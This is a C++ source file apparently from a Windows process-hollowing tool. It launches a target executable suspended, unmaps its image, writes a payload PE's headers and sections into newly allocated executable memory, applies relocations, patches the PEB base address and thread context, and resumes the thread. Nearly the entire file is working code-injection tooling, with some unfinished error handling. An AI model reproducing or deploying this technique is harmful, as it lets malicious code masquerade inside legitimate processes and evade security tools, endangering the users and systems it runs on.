#define _WIN32_WINNT 0x0600 // Defined for using functions that were
                            // introduced in Windows Vista / Server 2008
#include "ProcessHollowing.hpp"
#include "NtdllFunctions.hpp"
#include <iostream> // Delete!

ProcessHollowing::ProcessHollowing(const std::string& targetPath, const std::string& payloadPath) :
    _targetFilePath(targetPath), _payloadFilePath(payloadPath), _payloadBufferSize(0),
    _payloadBuffer(ReadFileContents(payloadPath, _payloadBufferSize)),
    _targetProcessInformation(CreateSuspendedTargetProcess())
{
    // Add checkings
}

void ProcessHollowing::hollow()
{
    std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl;

    PEB targetPEB = ReadTargetProcessPEB();

    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));

    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, targetPEB.ImageBaseAddress))
    {
        std::cout << "206" << std::endl;
        // Exception
    }
    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, nullptr,
        payloadNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(nullptr == targetNewBaseAddress)
    {
        std::cout << "202 Error Code: " << GetLastError() << std::endl;
    }

    WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);

    UpdateTargetProcessEntryPoint((ULONGLONG)((LPBYTE)targetNewBaseAddress + payloadNTHeaders.OptionalHeader.AddressOfEntryPoint), true /* <-- Change it! */);

    ULONGLONG delta = (ULONGLONG)targetNewBaseAddress - payloadNTHeaders.OptionalHeader.ImageBase;
    if(0 != delta)
    {
        RelocateTargetProcess(delta, targetNewBaseAddress);
        
        UpdateBaseAddressInTargetPEB(targetNewBaseAddress);
    }


    std::cout << "Resuming the target's main thread" << std::endl;
    
    NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);

    delete[] _payloadBuffer;
}

PROCESS_INFORMATION ProcessHollowing::CreateSuspendedTargetProcess()
{
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInformation;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ZeroMemory(&processInformation, sizeof(processInformation));

    if (0 == CreateProcessA(nullptr, (LPSTR)_targetFilePath.c_str(),
        nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startupInfo,
        &processInformation))
    {
        std::cout << "Could not open the target file!" << std::endl;
        // Exception
    }

    return processInformation;
}

PEB ProcessHollowing::ReadTargetProcessPEB()
{
    PROCESS_BASIC_INFORMATION targetBasicInformation;
    DWORD returnLength = 0;
    NtdllFunctions::_NtQueryInformationProcess(_targetProcessInformation.hProcess, ProcessBasicInformation,
        &targetBasicInformation, sizeof(targetBasicInformation), &returnLength);
    
    PEB processPEB;
    if (0 == ReadProcessMemory(_targetProcessInformation.hProcess, targetBasicInformation.PebBaseAddress, &processPEB, sizeof(processPEB),
        nullptr))
    {
        std::cout << "186" << std::endl;
        // Exception
    }

    return processPEB;
}

PBYTE ProcessHollowing::ReadFileContents(const std::string& filePath, DWORD& readBytesAmount)
{
    HANDLE sourceFileHandle = CreateFileA(filePath.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, nullptr);
    if (INVALID_HANDLE_VALUE == sourceFileHandle)
    {
        std::cout << "194" << std::endl;
        // Exception
    }

    DWORD sourceFileSize = GetFileSize(sourceFileHandle, nullptr);
    PBYTE fileContents = new BYTE[sourceFileSize];
    ReadFile(sourceFileHandle, fileContents, sourceFileSize, &readBytesAmount, nullptr);
    
    return fileContents;
}

void ProcessHollowing::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
{
    IMAGE_DOS_HEADER sourceDOSHeader = *((PIMAGE_DOS_HEADER)sourceFileContents);
    IMAGE_NT_HEADERS sourceNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew));

    std::cout << "Delta: " << (ULONGLONG)targetBaseAddress - sourceNTHeaders.OptionalHeader.ImageBase << std::endl;

    sourceNTHeaders.OptionalHeader.ImageBase = (ULONGLONG)targetBaseAddress;

    CopyMemory((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew, &sourceNTHeaders, sizeof(sourceNTHeaders));
    
    //std::cout << ::GetLastError() << std::endl;
    std::cout << "Writing headers" << std::endl;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents, sourceNTHeaders.OptionalHeader.SizeOfHeaders, nullptr))
    {
        std::cout << "213" << std::endl;
    }
    for (int i = 0; i < sourceNTHeaders.FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew +
            sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        printf("Writing %s\n", currentSection->Name);
        NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (PVOID)((LPBYTE)targetBaseAddress +
            currentSection->VirtualAddress), (PVOID)((LPBYTE)sourceFileContents + currentSection->PointerToRawData),
            currentSection->SizeOfRawData, nullptr);
    }
}

void ProcessHollowing::UpdateTargetProcessEntryPoint(ULONGLONG newEntryPointAddress, bool is64Bit)
{
/*#if defined(_WIN64)
    if (!is64Bit)
    {
        WOW64_CONTEXT processContext = { 0 };
        ZeroMemory(&processContext, sizeof(processContext));
        processContext.ContextFlags = WOW64_CONTEXT_INTEGER;
        if (0 == Wow64GetThreadContext(processMainThread, &processContext))
        {
            std::cout << "284" << std::endl;
            // Exception
        }

        processContext.Eax = (DWORD)newEntryPointAddress;
        if (0 == Wow64SetThreadContext(processMainThread, &processContext))
        {
            std::cout << "291" << std::endl;
            // Exception
        }
    }

    return;
#endif*/
    CONTEXT processContext = { 0 };
    ZeroMemory(&processContext, sizeof(processContext));
    processContext.ContextFlags = CONTEXT_INTEGER;
    if (0 == GetThreadContext(_targetProcessInformation.hThread, &processContext))
    {
        std::cout << "301" << std::endl;
        // Exception
    }

#if defined(_WIN64) // On 64 bit compiled binaries, CONTEXT will hold
                    // 64 bit registers
    processContext.Rcx = (DWORD64)newEntryPointAddress;
#else               // On 32 bit compiled binaries, CONTEXT will hold
                    // 32 bit registers
    processContext.Eax = (DWORD)newEntryPointAddress;
#endif

    if (0 == SetThreadContext(_targetProcessInformation.hThread, &processContext))
    {
        std::cout << "313" << std::endl;
        // Exception
    }
}

PIMAGE_SECTION_HEADER ProcessHollowing::FindTargetProcessSection(const std::string& sectionName)
{
    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
    BYTE maxNameLengthHolder[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };  // According to WinAPI, the name of the section can
                                                                    // be as long as the size of the buffer, which means
                                                                    // it won't always have a terminating null byte, so
                                                                    // we include one by ourselves.
    int i = 0;

    for (i = 0; i < payloadNTHeaders.FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew +
            sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

        if (0 != currentSectionHeader->Name[IMAGE_SIZEOF_SHORT_NAME - 1])
        {
            strncpy((char*)maxNameLengthHolder, (char*)currentSectionHeader->Name, IMAGE_SIZEOF_SHORT_NAME);
        }
        else
        {
            int nameLength = strlen((char*)currentSectionHeader->Name);
            strncpy((char*)maxNameLengthHolder, (char*)currentSectionHeader->Name, nameLength);
            maxNameLengthHolder[nameLength] = 0;
        }

        if (0 == strcmp(sectionName.c_str(), (char*)maxNameLengthHolder))
        {
            return currentSectionHeader;
        }
    }

    return nullptr;
    // Exception
}

void ProcessHollowing::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
{
    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
    IMAGE_DATA_DIRECTORY relocData = payloadNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD dwOffset = 0;
    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(".reloc");
    DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;
    printf("249 Header name: %s\n", relocSectionHeader->Name);

    while (dwOffset < relocData.Size)
        {
            PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&_payloadBuffer[dwRelocAddr + dwOffset];

            dwOffset += sizeof(BASE_RELOCATION_BLOCK);

            DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);

            PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&_payloadBuffer[dwRelocAddr + dwOffset];

            for (DWORD i = 0; i < dwEntryCount; i++)
            {
                dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (0 != pBlocks[i].Type)
                {
                    DWORD dwFieldAddress = pBlockHeader->PageAddress + pBlocks[i].Offset;

                    ULONGLONG dwBuffer = 0;
                    ReadProcessMemory(_targetProcessInformation.hProcess, (PVOID)((ULONGLONG)processBaseAddress + dwFieldAddress),
                        &dwBuffer, sizeof(dwBuffer), nullptr);
                    
                    dwBuffer += baseAddressesDelta;

                    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (PVOID)((ULONGLONG)processBaseAddress + dwFieldAddress), &dwBuffer, sizeof(dwBuffer), nullptr))
                    {
                        std::cout << "265 Error Code: " << GetLastError() << std::endl;
                    }
                }
            }
        }
}

void ProcessHollowing::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
{
    PROCESS_BASIC_INFORMATION targetBasicInformation;
    DWORD returnLength = 0;
    NtdllFunctions::_NtQueryInformationProcess(_targetProcessInformation.hProcess, ProcessBasicInformation,
        &targetBasicInformation, sizeof(targetBasicInformation), &returnLength);

    LPVOID pebImageBaseFieldAddress = (LPVOID)((LPBYTE)(targetBasicInformation.PebBaseAddress) + (sizeof(ULONGLONG) * 2));
    const size_t imageBaseSize = sizeof(ULONGLONG);

    SIZE_T written = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, pebImageBaseFieldAddress, &processNewBaseAddress, imageBaseSize, &written))
    {
        std::cout << "221" << std::endl;
    }
}

bool ProcessHollowing::IsProcess64Bit(const HANDLE processHandle)
{
#if defined(_WIN64)
    BOOL is32Bit = FALSE;
    IsWow64Process(processHandle, &is32Bit);

    return FALSE == is32Bit;
#else
    return false;
#endif
}

bool ProcessHollowing::IsPEFile64Bit(const PBYTE fileBuffer)
{
    IMAGE_DOS_HEADER dosHeader = *((PIMAGE_DOS_HEADER)fileBuffer);
    IMAGE_NT_HEADERS ntHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)fileBuffer + dosHeader.e_lfanew));

    return IMAGE_FILE_MACHINE_AMD64 == ntHeaders.FileHeader.Machine;
}